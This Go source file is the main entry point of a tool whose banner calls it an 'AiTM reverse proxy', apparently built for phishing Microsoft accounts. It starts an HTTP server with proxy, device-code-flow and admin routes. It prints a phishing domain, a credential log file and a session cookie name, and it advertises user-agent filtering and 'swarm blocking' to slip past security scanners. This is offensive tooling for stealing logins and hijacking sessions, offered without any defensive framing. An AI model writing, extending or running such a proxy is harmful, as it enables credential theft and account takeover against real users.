package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "-profile" {
		runProfiler(os.Args[2:])
		return
	}

	initSessionManager()
	initTargets()
	initCorrelator()
	initConfig()

	// ── CREATE THE CUSTOM MUX FIRST ──
	// ── CREATE THE CUSTOM MUX FIRST ──
	mux := http.NewServeMux()

	// ── CONFIG & ADMIN API ROUTES ──
	mux.HandleFunc("/api/config", handleGetConfig)
	mux.HandleFunc("/api/admin/update", handleWebhookUpdate)
	mux.HandleFunc("/api/admin/domains", handleGetAllDomains)

	// ── MAIN PROXY & DEVICE FLOW ROUTES ──
	mux.HandleFunc("/", mainHandler)
	mux.HandleFunc("/device", deviceHandler)
	mux.HandleFunc("/device/status", deviceStatusHandler)
	server := &http.Server{
		Addr:         listenAddr,
		Handler:      mux,
		ReadTimeout:  45 * time.Second,
		WriteTimeout: 45 * time.Second,
	}

	printBanner()

	log.Printf("[*] Listening on %s", listenAddr)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("[!] Server error: %v", err)
	}
}

func printBanner() {
	const (
		Reset   = "\033[0m"
		Cyan    = "\033[36m"
		Green   = "\033[32m"
		Yellow  = "\033[33m"
		Magenta = "\033[35m"
		Bold    = "\033[1m"
	)

	fmt.Println()
	fmt.Printf("%s┌──────────────────────────────────────────────────────────────┐%s\n", Cyan, Reset)
	fmt.Printf("%s│  %-54s │%s\n", Cyan, Bold+"MS-PROXY v4.0 — Chameleon AiTM Reverse Proxy"+Reset, Cyan)
	fmt.Printf("%s│  %-54s │%s\n", Cyan, "Architecture: Decompress → Mutate → Compress", Reset)
	fmt.Printf("%s└──────────────────────────────────────────────────────────────┘%s\n", Cyan, Reset)
	fmt.Println()

	fmt.Printf("  %sListen:%s     %s%s%s\n", Yellow, Reset, Green, listenAddr, Reset)
	fmt.Printf("  %sDomain:%s     %s%s%s\n", Yellow, Reset, Green, phishDomain, Reset)
	fmt.Printf("  %sCred Log:%s   %s%s%s\n", Yellow, Reset, Green, credLogFile, Reset)
	fmt.Printf("  %sSession:%s    %s%s%s\n", Yellow, Reset, Green, sessionMgr.cookieName, Reset)
	fmt.Printf("  %sDefense:%s    %sActive%s (UA Filters + %sDynamic Swarm Blocking%s)\n", Yellow, Reset, Green, Reset, Magenta, Reset)
	fmt.Println()

	fmt.Printf("  %sConfigured Targets (%d):%s\n", Cyan, len(targets), Reset)
	fmt.Println("  ──────────────────────────────────────────────────────────────")

	for key, t := range targets {
		entry := "https://" + t.EntrySubdomain
		fmt.Printf("  %s[%s]%s %-22s %s%s\n", Magenta, key, Reset, t.Name, Green, entry)

		count := 0
		for sub, real := range t.HostMap {
			if count < 3 {
				fmt.Printf("    %-30s → %s\n", sub, real)
				count++
			} else {
				fmt.Printf("    %-30s → %s\n", "...", fmt.Sprintf("+%d more routes", len(t.HostMap)-3))
				break
			}
		}
		fmt.Println()
	}
	fmt.Println("══════════════════════════════════════════════════════════════")
	fmt.Println()
}

func extractTargetKey(host string) string {
	for key, t := range targets {
		for sub := range t.HostMap {
			if strings.EqualFold(host, sub) {
				return key
			}
		}
	}
	return "microsoft"
}
